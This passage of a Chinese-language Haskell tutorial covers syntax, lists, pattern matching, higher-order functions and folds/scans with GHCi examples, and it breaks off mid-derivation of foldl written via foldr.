         -  `3.2 List comprehension <#List-comprehension>`__

      -  `4 Tuple <#Tuple>`__
      -  `5 Syntax in Functions <#Syntax-in-Functions>`__

         -  `5.1 Pattern matching <#Pattern-matching>`__
         -  `5.2 Guard syntax <#Guard-syntax>`__
         -  `5.3 Case expressions <#Case-expressions>`__
         -  `5.4 where <#where>`__
         -  `5.5 let <#let>`__
         -  `5.6 if statement <#if-statement>`__

      -  `6 Higher Order Functions <#Higher-Order-Functions>`__

         -  `6.1 Currying <#Currying>`__
         -  `6.2 一些高阶函数 <#一些高阶函数>`__

            -  `6.2.1 zipWith <#zipWith>`__
            -  `6.2.2 flip <#flip>`__
            -  `6.2.3 map <#map>`__
            -  `6.2.4 filter <#filter>`__
            -  `6.2.5 takeWhile <#takeWhile>`__

         -  `6.3 Function application <#Function-application>`__
         -  `6.4 Function Composition <#Function-Composition>`__
         -  `6.5 lambda <#lambda>`__
         -  `6.6 fold和scan <#fold和scan>`__

            -  `6.6.1 foldl <#foldl>`__
            -  `6.6.2 foldr <#foldr>`__
            -  `6.6.3 scanl和scanr <#scanl和scanr>`__
            -  `6.6.4 使用foldr编写foldl <#使用foldr编写foldl>`__

      -  `7 Modules <#Modules>`__

         -  `7.1 编写Modules <#编写Modules>`__

      -  `8 Types & Typeclasses <#Types-amp-Typeclasses>`__

         -  `8.1 Types <#Types>`__
         -  `8.2 Typeclasses <#Typeclasses>`__
         -  `8.3 Type variables <#Type-variables>`__
         -  `8.4 定义新Type <#定义新Type>`__

            -  `8.4.1 导出Type <#导出Type>`__
            -  `8.4.2 Record Syntax <#Record-Syntax>`__
            -  `8.4.3 Type parameters <#Type-parameters>`__
            -  `8.4.4 Either <#Either>`__
            -  `8.4.5 Derived instances <#Derived-instances>`__
            -  `8.4.6 Type synonyms <#Type-synonyms>`__
            -  `8.4.7 newtype keyword <#newtype-keyword>`__
            -  `8.4.8 Recursive data structures <#Recursive-data-structures>`__

         -  `8.5 定义新Typeclass <#定义新Typeclass>`__

            -  `8.5.1 手动创建实例 <#手动创建实例>`__
            -  `8.5.2 Functor Typeclass <#Functor-Typeclass>`__

         -  `8.6 Kinds <#Kinds>`__

      -  `9 Input/Output <#Input-Output>`__

         -  `9.1 运行Haskell程序 <#运行Haskell程序>`__
         -  `9.2 输出文本 <#输出文本>`__

            -  `9.2.1 do block <#do-block>`__

         -  `9.3 输入文本 <#输入文本>`__
         -  `9.4 其他IO相关函数用法 <#其他IO相关函数用法>`__

            -  `9.4.1 return <#return>`__
            -  `9.4.2 when <#when>`__
            -  `9.4.3 sequence <#sequence>`__
            -  `9.4.4 mapM & mapM\_ <#mapM-amp-mapM>`__
            -  `9.4.5 forever <#forever>`__
            -  `9.4.6 forM <#forM>`__
            -  `9.4.7 getContents <#getContents>`__
            -  `9.4.8 interact <#interact>`__

         -  `9.5 文件和流 <#文件和流>`__

            -  `9.5.1 openFile <#openFile>`__
            -  `9.5.2 withFile <#withFile>`__
            -  `9.5.3 readFile <#readFile>`__
            -  `9.5.4 writeFile <#writeFile>`__
            -  `9.5.5 appendFile <#appendFile>`__
            -  `9.5.6 buffer <#buffer>`__
            -  `9.5.7 openTempFile <#openTempFile>`__

         -  `9.6 路径操作 <#路径操作>`__

            -  `9.6.1 getCurrentDirectory <#getCurrentDirectory>`__
            -  `9.6.2 removeFile <#removeFile>`__
            -  `9.6.3 renameFile <#renameFile>`__
            -  `9.6.4 doesFileExist <#doesFileExist>`__

         -  `9.7 Command line arguments <#Command-line-arguments>`__

            -  `9.7.1 getArgs <#getArgs>`__
            -  `9.7.2 getProgName <#getProgName>`__

         -  `9.8 Randomness <#Randomness>`__

            -  `9.8.1 random <#random>`__
            -  `9.8.2 randoms <#randoms>`__
            -  `9.8.3 randomR <#randomR>`__
            -  `9.8.4 randomRs <#randomRs>`__
            -  `9.8.5 getStdGen <#getStdGen>`__
            -  `9.8.6 newStdGen <#newStdGen>`__

         -  `9.9 Exceptions <#Exceptions>`__

      -  `10 Functors <#Functors>`__

         -  `10.1 Functor 实例 <#Functor实例>`__

            -  `10.1.1 [] <#>`__
            -  `10.1.2 Maybe <#Maybe>`__
            -  `10.1.3 Either a <#Either-a>`__
            -  `10.1.4 IO <#IO>`__
            -  `10.1.5 (,) a <#a>`__
            -  `10.1.6 (->) r <#gt-r>`__

         -  `10.2 Functor Laws <#Functor-Laws>`__
         -  `10.3 Intuition <#Intuition>`__
         -  `10.4 常用函数 <#常用函数>`__

            -  `10.4.1 <$> <#lt-gt>`__
            -  `10.4.2 $> <#gt>`__
            -  `10.4.3 void <#void>`__

      -  `11 Applicative Functor <#Applicative-Functor>`__

         -  `11.1 Applicative Functor 实例 <#Applicative-Functor实例>`__

            -  `11.1.1 Maybe <#Maybe-1>`__
            -  `11.1.2 [] <#-1>`__
            -  `11.1.3 IO <#IO-1>`__
            -  `11.1.4 (->) r <#gt-r-1>`__
            -  `11.1.5 ZipList <#ZipList>`__

         -  `11.2 Applicative Functor Laws <#Applicative-Functor-Laws>`__
         -  `11.3 Intuition <#Intuition-1>`__
         -  `11.4 常用函数 <#常用函数-1>`__

            -  `11.4.1 liftA & liftA2 & liftA3 <#liftA-amp-liftA2-amp-liftA3>`__
            -  `11.4.2 <\* & \*> <#lt-amp-gt>`__
            -  `11.4.3 <\*\*> <#lt-gt-1>`__
            -  `11.4.4 when & unless <#when-amp-unless>`__
            -  `11.4.5 sequenceA <#sequenceA>`__

      -  `12 Monad <#Monad>`__

         -  `12.1 Monad 实例 <#Monad实例>`__

            -  `12.1.1 Maybe <#Maybe-2>`__
            -  `12.1.2 [] <#-2>`__
            -  `12.1.3 IO <#IO-2>`__
            -  `12.1.4 (->) r <#gt-r-2>`__

         -  `12.2 do-notation <#do-notation>`__

            -  `12.2.1 ApplicativeDo <#ApplicativeDo>`__

         -  `12.3 Monad Laws <#Monad-Laws>`__

            -  `12.3.1 组合运算符（>=>）形式 <#组合运算符（-gt-gt-）形式>`__
            -  `12.3.2 do-notation形式 <#do-notation形式>`__

         -  `12.4 Intuition <#Intuition-2>`__
         -  `12.5 常用函数 <#常用函数-2>`__

            -  `12.5.1 liftM & ap <#liftM-amp-ap>`__
            -  `12.5.2 sequence <#sequence-1>`__
            -  `12.5.3 replicateM <#replicateM>`__
            -  `12.5.4 mapM & forM <#mapM-amp-forM>`__
            -  `12.5.5 =<< & >=> & <=< <#lt-lt-amp-gt-gt-amp-lt-lt>`__

      -  `13 MonadFail <#MonadFail>`__

         -  `13.1 MonadFail 实例 <#MonadFail实例>`__
         -  `13.2 MonadFail Law <#MonadFail-Law>`__

      -  `14 Semigroup <#Semigroup>`__

         -  `14.1 Semigroup Law <#Semigroup-Law>`__
         -  `14.2 补：NonEmpty <#补：NonEmpty>`__

      -  `15 Monoid <#Monoid>`__

         -  `15.1 实例 <#实例>`__

            -  `15.1.1 [a] <#a-1>`__
            -  `15.1.2 Ordering <#Ordering>`__
            -  `15.1.3 Sum & Product <#Sum-amp-Product>`__
            -  `15.1.4 All & Any <#All-amp-Any>`__
            -  `15.1.5 Monoid a => Maybe a <#Monoid-a-gt-Maybe-a>`__
            -  `15.1.6 First & Last <#First-amp-Last>`__
            -  `15.1.7 Min & Max <#Min-amp-Max>`__
            -  `15.1.8 元组 <#元组>`__

         -  `15.2 Monoid Laws <#Monoid-Laws>`__

      -  `16 Monoidal classes <#Monoidal-classes>`__

         -  `16.1 Alternative <#Alternative>`__

            -  `16.1.1 Alternative 实例 <#Alternative实例>`__
            -  `16.1.2 Alternative Laws <#Alternative-Laws>`__
            -  `16.1.3 常用函数 <#常用函数-3>`__

         -  `16.2 MonadPlus <#MonadPlus>`__

            -  `16.2.1 MonadPlus 实例 <#MonadPlus实例>`__
            -  `16.2.2 MonadPlus Laws <#MonadPlus-Laws>`__
            -  `16.2.3 常用函数 <#常用函数-4>`__

         -  `16.3 ArrowPlus <#ArrowPlus>`__

      -  `17 一些其它typeclasses <#一些其它typeclasses>`__

         -  `17.1 Foldable <#Foldable>`__

            -  `17.1.1 Foldable 实例 <#Foldable实例>`__
            -  `17.1.2 常用函数 <#常用函数-5>`__

         -  `17.2 Traversable <#Traversable>`__

            -  `17.2.1 Traversable 实例 <#Traversable实例>`__
            -  `17.2.2 Traversable Laws <#Traversable-Laws>`__

         -  `17.3 Bifunctor <#Bifunctor>`__

            -  `17.3.1 Bifunctor Laws <#Bifunctor-Laws>`__

         -  `17.4 Category <#Category>`__
         -  `17.5 Arrow <#Arrow>`__

            -  `17.5.1 Arrow notation <#Arrow-notation>`__
            -  `17.5.2 ArrowChoice <#ArrowChoice>`__
            -  `17.5.3 ArrowZero & ArrowPlus <#ArrowZero-amp-ArrowPlus>`__
            -  `17.5.4 例子 <#例子>`__

      -  `18 Haskell 与范畴论 <#Haskell与范畴论>`__

         -  `18.1 范畴（Category） <#范畴（Category）>`__

            -  `18.1.1 范畴公理 <#范畴公理>`__
            -  `18.1.2 $\\mathbf{Hask}$ 范畴 <#mathbf-Hask-范畴>`__

         -  `18.2 函子（Functors） <#函子（Functors）>`__

            -  `18.2.1 函子公理 <#函子公理>`__
            -  `18.2.2 $\\mathbf{Hask}$ 范畴上的函子 <#mathbf-Hask-范畴上的函子>`__

         -  `18.3 单子（Monads） <#单子（Monads）>`__

            -  `18.3.1 单子公理 <#单子公理>`__

      -  `19 后记 <#后记>`__
      -  `20 Reference <#Reference>`__


   .. rubric:: ` <#基础运算>`__ 基础运算
      :name: 基础运算

    .. code-block:: 

        + - * / ()      ：加减乘除
        div             ：整除
        mod             ：取模
        True False      ：布尔值
        || && not       ：或且非
        ==              ：条件判断，相等
        /=              ：条件判断，不等


   .. rubric:: ` <#函数调用>`__ 函数调用
      :name: 函数调用

      Haskell 中调用函数不加括号，先写出函数名，然后逐个列出参数，用空格隔开。
      运算符也是函数，是中缀函数（infix operators）：

      .. code-block:: haskell

           ghci> max 1 2
           2
           ghci> 1 + 1
           2

      这种函数名称打头，参考后跟的语法称为函数的前缀表达（prefix）。函数可以写在参数中间，
      这种形式称为中缀表达（infix），Haskell 所有运算符都默认为中缀。

      前缀（prefix）函数与中缀（infix）函数转换：

      -  对前缀函数加双反引号 \`\` 使其变成中缀函数
      -  对中缀函数加圆括号 () 使其变成前缀函数

      .. container:: float highlight haskell

         ::

            ghci> 4 `div` 2
            2
            ghci> 1 `max` 2
            2
            ghci> (+) 1 2
            3
            ghci> (||) True False
            True

   .. rubric:: ` <#List>`__ List
      :name: List

      列表是 Haskell 中很常见的数据类型，和 Python 中不同，Haskell 中的列表中的所有元素必须是同一个类型。

      以下是列表常用的函数：

      -  ``(++)``    :: [a] -> [a] -> [a]：合并两个列表
      -  ``(:)``     :: a -> [a] -> [a]  ：将单个元素并入列表。 [1, 2, 3] 是 1:2:3:[] 的语法糖
      -  ``(!!)``    :: [a] -> Int -> a  ：通过索引取出某个位置上的元素。a !! 1 相当于 Python 中的 a[1]
      -  ``head``    :: [a] -> a         ：返回列表的第一个元素
      -  ``tail``    :: [a] -> [a]       ：返回列表中除去第一个元素后的列表（若只有一个元素则返回空列表[]）
      -  ``last``    :: [a] -> a         ：返回列表中的最后一个元素
      -  ``init``    :: [a] -> [a]       ：返回列表中除去最后一个元素后的列表
      -  ``reverse`` :: [a] -> [a]                       ：返回翻转后的列表
      -  ``take``    :: Int -> [a] -> [a]                ：返回列表a的前n个元素的列表(take n a)
      -  ``drop``    :: Int -> [a] -> [a]                ：返回列表a中除去前n个元素后的列表(drop n a)
      -  ``length``  :: Foldable t => t a -> Int         ：返回列表的长度
      -  ``null``    :: Foldable t => t a -> Bool        ：返回列表是否为空
      -  ``maximum`` :: (Foldable t, Ord a) => t a -> a  ：返回列表中的最大值
      -  ``minimum`` :: (Foldable t, Ord a) => t a -> a  ：返回列表中的最小值
      -  ``sum``     :: (Foldable t, Num a) => t a -> a  ：返回列表中所有元素的和
      -  ``product`` :: (Foldable t, Num a) => t a -> a  ：返回列表中所有元素的积
      -  ``elem``    :: (Foldable t, Eq a) => t a -> Bool：判断值 n 是否在列表 a 中(

         .. container:: float highlight haskell

            ::

               elem n a
               -- 或
               n `elem`  a --用双反引号 `` 包上可以变成中缀函数使用


      .. rubric:: ` <#Texas-ranges>`__ Texas ranges
         :name: Texas-ranges

      使用 ``..`` 可以表示出范围并自动推导：

      .. container:: float highlight haskell

         .. code-block:: haskell

               ghci> [1 .. 10]  
               [1,2,3,4,5,6,7,8,9,10]  
               ghci> ['a' .. 'z']  
               "abcdefghijklmnopqrstuvwxyz"  
               ghci> ['K' .. 'Z']  
               "KLMNOPQRSTUVWXYZ" 
               ghci> [2, 4 .. 20]  
               [2,4,6,8,10,12,14,16,18,20]  
               ghci> [3, 6 .. 20]  
               [3,6,9,12,15,18]
               ghci> [5, 4 .. 1]
               [5,4,3,2,1]

      如 [1..]、[1, 3..] 也可以用来生成无穷列表，也有函数可以生成无穷列表：

      -  ``cycle`` :: [a] -> [a]：将原列表不断循环生成无穷列表
      -  ``repeat`` :: a -> [a]：将传入的值不断重复生成无穷列表
      -  ``replicate`` :: Int -> a -> [a]：将值 a 重复 n 次 (replicate n a)

      .. rubric:: ` <#List-comprehension>`__ List
         comprehension
         :name: List-comprehension

      Haskell 也有列表推导，形式是一个中括号，竖杠左侧为表达式，右侧为变量的范围和约束条件。

      .. container:: float highlight haskell

         ::

            ghci> [x * 2 | x <- [1 .. 10]]  
            [2,4,6,8,10,12,14,16,18,20]

            ghci> [x * 2 | x <- [1 .. 10], x * 2 >= 12]  
            [12,14,16,18,20]

            ghci> [ x | x <- [50 .. 100], x `mod` 7 == 3]  
            [52,59,66,73,80,87,94]

            ghci> [x * y | x <- [2, 5, 10], y <- [8, 10, 11]]  
            [16,20,22,40,50,55,80,100,110]


   .. rubric:: ` <#Tuple>`__ Tuple
      :name: Tuple

      Haskell 元组可以有不同长度，元素可以有不同类型。元组的类型由所有元素的类型共同决定。
      常用的元组相关函数：

      -  ``fst`` :: (a, b) -> a 返回含有两个元素元组中的第一个元素
      -  ``snd`` :: (a, b) -> b 返回含有两个元素元组中的第二个元素
      -  ``zip`` :: [a] -> [b] -> [(a, b)] 接收两个列表，返回一个列表（元素为两上输入列表的元素配对）


   .. rubric:: ` <#Syntax-in-Functions>`__ Syntax in
      Functions
      :name: Syntax-in-Functions

      以下定义一个 plus 函数，并省略其类型：

      .. container:: float highlight haskell

        ::

            ghci> plus x y = x + y
            ghci> :t plus
            plus :: Num a => a -> a -> a   

      Haskell 会自动推断函数的类型，最好在定义函数前声明函数的类型：

      .. container:: float highlight haskell
         
          ::

             plus :: (Num a) => a -> a -> a
             plus x y = x + y

      .. rubric:: ` <#Pattern-matching>`__ Pattern matching
         :name: Pattern-matching

         函数定义可以使用模式匹配语法，这一点体现了函数即映射的本质。调用函数时，根据参数映射
         到相应的函数体，并返回相应的值。模式匹配从前到后依次判断，Pattern Matching 逐个匹配，
         直到匹配成功，也因此，最后必须要给出一种通用的匹配来接收与给出模式全不匹配的输入。如：

         .. container:: float highlight haskell

            ::

               factorial :: (Integral a) => a -> a
               factorial 0 = 1
               factorial n = n * factorial (n - 1)

               first :: (a, b, c) -> a
               first (x, _, _) = x

               second :: (a, b, c) -> b
               second (_, y, _) = y

               third :: (a, b, c) -> c
               third (_, _, z) = z
            

         其中，下划线 ``_`` 表示任何值，且不关心它的内容，只是一个占位符号。

         列表的 (:) 运算符号也可以用来进行模式匹配：

         .. container:: float highlight haskell
            
             ::

                head' :: [a] -> a
                head' [] = error "Can't call head on an empty list, dummy!"
                head' (x:_) = x

                sum' :: (Num a) => [a] -> a
                sum' [] = 0
                sum' (x:xs) = x + sum' xs

         在针对列表进行模式匹配时，如果同时需要整个列表、列表的第一个值、列表除第一个值外的内容，
         可以使用 ``xs@(x:rest)`` 这样的语法，x 和 rest 将分别绑定列表的第一个元素、余下元素。
         比如 ``xs@(q:qs)`` 匹配 [1, 2, 3] 列表，xs 就为 [1, 2, 3]，q 为 1，qs 为 [2, 3]

         以上这种 var@pat 匹配模式称为 as-patterns。
         
         但是，(++) 操作不可以用来模式匹配。

      .. rubric:: ` <#Guard-syntax>`__ Guard syntax
         :name: Guard-syntax

         函数定义可以使用守卫（guard）语法以缩短函数体的编写：

         .. container:: float highlight haskell
         ::

            max' :: (Ord a) => a -> a -> a  
            max' a b   
                | a > b     = a  
                | otherwise = b 

         先给出传入的参数变量，然后下一行缩进后加竖杠（|），竖杠到等号前的表达式表示进行条件判断，
         如果为 True 则返回等号后面的值；如果为 False 则继续判断下一行，直到 otherwise。

      .. rubric:: ` <#Case-expressions>`__ Case expressions
         :name: Case-expressions

         在函数的定义中，也可以将 case 表达式配合模式匹配使用：

         .. container:: float highlight haskell
         ::

            case expression of pattern -> result  
                               pattern -> result
                               ...  

         例如：

         .. container:: float highlight haskell
         ::

            head' :: [a] -> a  
            head' [] = error "No head for empty lists!"  
            head' (x:_) = x  
            -- 等价于：
            head' :: [a] -> a  
            head' xs = case xs of [] -> error "No head for empty lists!"  
                                  (x:_) -> x  

         .. container:: float highlight haskell
         ::

            describeList :: [a] -> String  
            describeList xs = "The list is " ++ case xs of [] -> "empty."  
                                                           [x] -> "a singleton list."   
                                                           xs -> "a longer list."  
            -- 等价于：
            describeList :: [a] -> String  
            describeList xs = "The list is " ++ what xs  
                where what [] = "empty."  
                      what [x] = "a singleton list."  
                      what xs = "a longer list." 

      .. rubric:: ` <#where>`__ where
         :name: where

         声明在函数定义中要使用的局部变量，可以使用 where 关键字：

         .. container:: float highlight haskell
         ::

            initials :: String -> String -> String  
            initials firstname lastname = [f] ++ ". " ++ [l] ++ "."  
                where (f:_) = firstname  
                      (l:_) = lastname  

         where 从句中也可以使用模式匹配。

      .. rubric:: ` <#let>`__ let
         :name: let

         在函数的定义中使用 let 表达式 (let expression)：``let <bindings> in <expression>``，
         此表达式也可以在普通算式或列表中使用，它属于上下文无关（Context-Free）的表达式。

         let 后跟任意数量的局部定义，in 关键字将这些局部定义与主要表达式分开：

         .. container:: float highlight haskell
         ::

            cylinder :: (RealFloat a) => a -> a -> a  
            cylinder r h = 
                let sideArea = 2 * pi * r * h  
                    topArea = pi * r ^2  
                in  sideArea + 2 * topArea  

         .. container:: float highlight haskell
         ::

            ghci> 4 * (let a = 9 in a + 1) + 2  
            42 
            ghci> [let square x = x * x in (square 5, square 3, square 2)]  
            [(25,9,4)] 


      .. rubric:: ` <#if-statement>`__ if statement
         :name: if-statement

         Haskell 中的 if 条件语句语法为：

         .. container:: float highlight haskell
         ::

            if ... then ...
            else ...
            -- or if ... then ... else ...
            -- or
            if ... then ...
            else if ... then ...
            else ...

         最后的 else 无论如何也不可以省去。


   .. rubric:: ` <#Higher-Order-Functions>`__ Higher Order Functions
      :name: Higher-Order-Functions

      .. rubric:: ` <#Currying>`__ Currying
         :name: Currying

         Haskell 函数是柯里化函数（Currying），函数都只接收一个参数。接收两个参数的函数实际上
         是这个函数接收了第一个参数后，返回了一个接收第二个参数的函数，最后返回最终的结果。比如
         max 函数，它的类型签名是：

            max :: Ord a => a -> a -> a

         可以看成 a -> (a -> a)，即接收一个参数，返回一个类型为 a -> a 的函数。
         比如 max 1 的类型签名是：

            max 1 :: (Ord a, Num a) => a -> a

         因此 max 1 2，也就等同于 (max 1) 2，即对数字 2 应用函数 max 1。

         函数也可以接收函数作为参数，参数有函数的函数就被称为高阶函数（Higher Order Functions）

      .. rubric:: ` <#一些高阶函数>`__ 一些高阶函数
         :name: 一些高阶函数

         .. rubric:: ` <#zipWith>`__ zipWith
            :name: zipWith

            zipWith :: (a -> b -> c) -> [a] -> [b] -> [c]

            第一个参数为一个函数，然后接收两个列表，将其对应元素传入接收的函数中，得到的结果组成
            一个新的列表。如果两个传入的列表长度不同，以最短的列表为准，长列表中超出的元素省略。

            .. container:: float highlight haskell
            ::

               ghci> zipWith (+) [4,2,5,6] [2,6,2,3]  
               [6,8,7,9]  

               ghci> zipWith max [6,3,2,1] [7,3,1,5]  
               [7,3,2,5]  

         .. rubric:: ` <#flip>`__ flip
            :name: flip

            flip :: (a -> b -> c) -> b -> a -> c

            flip 函数接收一个二元函数，返回一个新的二元函数，将其输入的两个参数顺序反转：

            .. container:: float highlight haskell
            ::

               ghci> zip [1,2,3,4,5] "hello"
               [(1,'h'),(2,'e'),(3,'l'),(4,'l'),(5,'o')]

               ghci> flip zip [1,2,3,4,5] "hello"  
               [('h',1),('e',2),('l',3),('l',4),('o',5)]

         .. rubric:: ` <#map>`__ map
            :name: map

            map :: (a -> b) -> [a] -> [b]

            map 函数接收一个函数 f 和一个列表 [a]，对列表每个元素应用 f 并返回结果组成的列表 [b]：

            .. container:: float highlight haskell
            ::

               ghci> map (+3) [1,5,3,1,6]  
               [4,8,6,4,9]  

            map 函数与 fmap 函数的差别在于后者是 Functor 可以与其它函子一起使用：
            ::

               ghci> :t map
               map :: (a -> b) -> [a] -> [b]

               ghci> :t fmap
               fmap :: Functor f => (a -> b) -> f a -> f b 


         .. rubric:: ` <#filter>`__ filter
            :name: filter

            filter :: (a -> Bool) -> [a] -> [a]

            filter 函数接收一个函数 f 和一个列表 a，将列表 a 中的每个元素传入函数 f 中，
            如果结果为 True 就保留，结果为 False 就丢弃，返回所有保留的元素组成的新列表：

            .. container:: float highlight haskell
            ::

               ghci> filter even [1..10]  
               [2,4,6,8,10] 


         .. rubric:: ` <#takeWhile>`__ takeWhile
            :name: takeWhile

            takeWhile :: (a -> Bool) -> [a] -> [a]

            takeWhile 函数接收一个函数f和一个列表 a，将列表 a 中从左向右每个元素传入函数 f，
            直到结果为 False 停止，返回停止前传入的所有元素组成的新列表：

            .. container:: float highlight haskell
            ::

               ghci> takeWhile (/=' ') "word1 word2"
               "word1"


      .. rubric:: ` <#Function-application>`__ Function application
         :name: Function-application

         函数应用可以使用 ``$`` 函数，它的类型是：

         ($) :: (a -> b) -> a -> b

         它可以改变函数结合优先级，将左侧函数应用于全部右侧内容上，相当于给右侧整体加上了括号。
         否则函数默认左结合，会依次向右应用而不会应用在整体上。

         .. container:: float highlight haskell
         ::

            f $ g x     -- 等价于 f (g x)
            
            f g x       -- 等价于 (f g) x


      .. rubric:: ` <#Function-Composition>`__ Function Composition
         :name: Function-Composition

         数学语言使用 ∘ 符号表示复合函数，即将多个函数复合得到一个函数，比如 (f∘g)(x) 表示 f(g(x))。
         Haskell 中使用 ``.`` 函数复合多个函数，只需要在要复合的函数之间使用它，它的类型是：

         (.) :: (b -> c) -> (a -> b) -> a -> c

         定义是：

            f . g = \\x -> f (g x)

         但是函数复合的优先级要比函数执行低，比如：

         .. container:: float highlight haskell
         ::

            sum . replicate 5 . max 6.7 8.9

         会先执行max 6.7 8.9并返回8.9，然后将sum、replicate
         5、8.9复合，但两个函数无法和一个值(8.9)复合，所以会抛出异常。因此要使用 ``$`` 来规定先复合再执行：

         .. container:: float highlight haskell
         ::

            sum . replicate 5 . max 6.7 $ 8.9


      .. rubric:: ` <#lambda>`__ lambda
         :name: lambda

         Haskell 语言的匿名函数（lambda expression）表达式使用斜杠 ``\`` 来表示，可能看着像 λ？

         .. container:: float highlight haskell
         ::

            \para1 para2 ... -> return

         “->” 前是传入参数（para1 para2 …），单个多个都可以，需要用空格隔开；
         ”->” 后是计算得到的返回值（return）。一般需要用括号将整个表达式括起来，防止返回值部分一直向右延伸。


      .. rubric:: ` <#fold和scan>`__ fold和scan
         :name: fold和scan

         fold 和 scan 都接收三个参数（一个二元函数，一个初始值 accumulator，一个要折叠的列表）。
         fold 返回一个值，scan 返回一个列表。

         函数将 accumulator 和从列表中取出的值一同传入给参数指定的二元函数 ``f :: a -> b -> b``。
         函数名称后缀 l 或 r 对应向左、向右折叠或扫描两种形式。

      .. rubric:: ` <#foldl>`__ foldl
         :name: foldl

         左折叠，每次从列表最左侧取出一个值，和 accumulator 一起传入二元函数，并且 accumulator 在左边为第一个参数，如：

         .. container:: float highlight haskell
         ::

            foldl f a xs

         它的结果计算过程为

         .. container:: float highlight haskell
         ::

            > foldl f a [x1, x2, x3]
            [1.] a = f a x1
            [2.] a = f a x2 = f (f a x1) x2
            [3.] a = f a x3 = f (f (f a x1) x2) x3

         可以看出 f (f a x1) x2 其实就是 foldl f a [x1, x2]
         而且因此，foldl在计算时最外层需要找到x3，这样如果xs是一个无穷列表，那么将无法计算，陷入无穷。所以foldl虽然看起来从左边取值，但是函数需要从右侧展开，并不适用于无穷列表

      .. rubric:: ` <#foldr>`__ foldr
         :name: foldr

         右折叠，每次从列表最右侧取出一个值，和accumulator一起传入二元函数，并且accumulator在右边为第二个参数，如：

         .. container:: float highlight haskell
         ::

            foldr f a xs

         它的结果计算过程为

         .. container:: float highlight haskell
         ::

            > foldr f a [x1, x2, x3]
            [1.] a = f x3 a
            [2.] a = f x2 a = f x2 (f x3 a)
            [3.] a = f x1 a = f x1 (f x2 (f x3 a))

         | 从中可以看出 f x2 (f x3 a) 就是 foldr f a [x2, x3]
         | 因此可以使用递归来写一个和foldr效果一样的函数:

         .. container:: float highlight haskell
         ::

            foldr' :: (a -> b -> b) -> b -> [a] -> b
            foldr' _ x [] = x
            foldr' f a (x:xs) = f x (foldr' f a xs)

         也可以看出，最外层计算时只需要x1并且向下递归，并不会接触到列表末尾，因此可以用于无穷列表。foldr即使看上去从右边取值，但是要从左开始展开，可以用于无穷列表

         例如：

         .. container:: float highlight haskell
         ::

            ghci> foldr (||) False (repeat True)
            True    -- 由于逻辑运算存在短路，计算值全应为True，所以直接返回了
            ghci> foldl (||) False (repeat True)
            -- 这里什么都不会发生，直到电脑内存被爆掉
            -- 因为函数刚开始就需要列表最右侧的值，所以在不断计算这个无穷列表

      .. rubric:: ` <#scanl和scanr>`__ scanl和scanr
         :name: scanl和scanr

      | scan类似fold，只是将中间得到的每一个值都添加进一个列表中并返回这个列表
      | scanl则向右延伸这个列表，scanr则向左延伸这个列表
      | 但是它和fold恰恰相反，scanl能用于无穷列表，而scanr不能

      .. container:: float highlight haskell
      ::

         > scanr f a [x1, x2, x3]
         [1.] 最右侧元素(-1 in python) : a
         [2.] 右侧第二个元素(-2) : f x3 a
         [3.] 右侧第三个元素(-3) : f x2 (f x3 a)
         [4.] 右侧第四个元素(-4) : f x1 (f x2 (f x3 a))

      | 可以看出 f x2 (f x3 a) 是 foldr f a [x2, x3]，也是
        scanr f a [x2, x3] 的第一个元素
      | 因此可以用递归来写一个和scanr效果一样的函数：

      .. container:: float highlight haskell
      ::

         scanr' :: (a -> b -> b) -> b -> [a] -> [b]
         scanr' _ x [] = [x]
         -- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xs
         scanr' f a (x:xs) = f x q : qs
                             where qs@(q:_) = scanr' f a xs

      scanl也是同理：

      .. container:: float highlight haskell
      ::

         scanl' :: (b -> a -> b) -> b -> [a] -> [b]
         scanl' _ x [] = [x]
         scanl' f a (x:xs) = a : scanl' f (f a x) xs

      也可以看出，scanr返回的列表的第一个元素是最后添加进去的，所以它无法用于无穷列表。而scanl返回的列表中的元素是从左到右依次添加，可以用于无穷列表截取前一部分结果：

      .. container:: float highlight haskell
      ::

         ghci> take 10 (scanl (+) 0 [1..])
         [0,1,3,6,10,15,21,28,36,45]
         ghci> take 10 (scanr (+) 0 [1..])
         [*** Exception: stack overflow

      .. rubric:: ` <#使用foldr编写foldl>`__ 使用foldr编写foldl
         :name: 使用foldr编写foldl

      pdcxs还给我介绍了一个神奇的操作，用foldl来定义foldr：

      .. container:: float highlight haskell
      ::

         foldl' f z xs = foldr (\x g y -> g (f y x)) id xs z

      它利用 foldr (\\x g y -> g (f y x)) id xs
      生成一个函数，作用于z得到结果。

      先来看一下foldr的类型：

      .. container:: float highlight haskell
      ::

         foldr :: Foldable t => (a -> b -> b) -> b -> t a -> b
         -- 可以看成 (a -> b -> b) -> b -> [a] -> b

      但是在这个例子中，类型b并不是一个数字，而是一个函数(b
      -> b)。

      所以这里foldr的类型可以写成：

      (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b
      -> b)

      | 对应于用法 foldr (\\x g y -> g (f y x)) id xs
        ，它返回的值应该是一个函数，类型为 b ->
        b（后面要作用于z）
      | 而xs对应于[a]；id对应于(b -> b)
      | 所以 (\\x g y -> g (f y x)) 要对应于：

      (a -> (b -> b) -> (b -> b))

      因此可以推断出x的类型是a；y的类型是b；而返回的值为一个类型为(b
      -> b)的函数。

      | 再看，返回的值是 g (f y x) ，其中 f y x
        返回的是一个值，类型为b
      | 所以g接收一个类型b，返回一个类型b ->
        b。即g的类型为：

      b -> (b -> b)

      现在根据foldr的定义：

      foldr f a (x:xs) = f x (foldr f a xs)

      带入计算一下：

         xs即为[x1..xn]，为了方便，用xs’来表示[x2..xn]，用xs’’来表示[x3..xn]

         定义中的f即为(\\x g y -> g (f y x))，a即为id

      .. container:: float highlight haskell
      ::

           foldr (\x g y -> g (f y x)) id xs z
         = (\x g y -> g (f y x)) x1 (foldr (...) id xs') z

      写完第一步，可以发现，x1 (foldr (…) id xs’) z
      正好分别对应了lambda表达式中的x、g、y。可以将其应用，进一步展开：

      .. container:: float highlight haskell
      ::

           (\x g y -> g (f y x)) x1 (foldr (...) id xs') z
         = (foldr (...) id xs') (f z x1)

      不难发现，原式 (foldr (…) id xs) z 等价于：

      (foldr (...) id xs') (f z x1)

      | 跟着这个思路，xs每次少一个开头的元素x’，z每次变换成为
        f z x’
      | 因此下一步：

      .. container:: float highlight haskell
      ::

           (\x g y -> g (f y x)) x1 (foldr (...) id xs') z
         = (foldr (...) id xs') (f z x1)
         = (foldr (...) id xs'') (f (f z x1) x2)
         = (foldr (...) id xs''') (f (f (f z x1) x2) x3)
         = ...

      可以发现，已经有了规律。那么最终停止时是什么样呢？

      | 最后到了不能在展开时，最前面的 foldr (…) id xs
